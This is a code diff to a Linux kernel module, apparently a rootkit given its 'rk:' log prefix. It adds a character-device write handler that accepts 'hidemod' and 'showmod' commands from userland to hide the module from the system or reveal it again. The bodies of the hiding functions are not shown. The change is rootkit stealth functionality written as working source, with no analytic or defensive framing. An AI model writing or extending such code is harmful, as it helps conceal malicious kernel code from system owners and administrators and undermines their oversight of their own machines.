@@ -33,6 +33,10 @@ static int     device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 
+// Other prototypes
+void hide_module();
+void show_module();
+
 static struct file_operations fops =
 {
    .owner = THIS_MODULE,
@@ -56,6 +60,26 @@ static ssize_t device_read(struct file *filep, char *buffer, size_t len, loff_t 
 // Receives data from userland
 static ssize_t device_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
+    char *cmds = (char *)kzalloc(len + 1, GFP_KERNEL);
+    
+    if (cmds) {
+        copy_from_user(cmds, buffer, len);
+        
+        char *tok = cmds, *end =cmds;
+        
+        // Get command
+        strsep(&end, " ");
+        
+        if (strcmp(tok, "hidemod") == 0) {
+            hide_module();
+            printk(KERN_INFO "rk: Module hidden.");
+        }
+        else if (strcmp(tok, "showmod") == 0) {
+            show_module();
+            printk(KERN_INFO "rk: Module revealed.");
+        }           
+    }
+    kfree(cmds);
     return len;
 }
 
